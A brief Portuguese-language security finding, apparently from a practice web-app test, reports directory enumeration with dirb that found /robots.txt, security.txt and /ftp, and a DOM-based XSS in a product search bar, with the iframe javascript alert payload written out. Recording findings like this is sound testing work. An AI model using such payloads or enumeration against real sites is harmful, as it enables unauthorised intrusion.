Usando a feramenta dirb, encontrei arquivos com informações confidênciais:
![image](https://github.com/user-attachments/assets/64b93620-0a2e-4f6d-a8d6-e396f8cee894)

/robots.txt
/.well-known/security.txt
/ftp

XSS Dom based encontrado na barra de pesquisa de produtos:
![image](https://github.com/user-attachments/assets/3953128b-66fc-46eb-abbc-e779822f0110)


payload: <iframe src="javascript:alert('teste')">
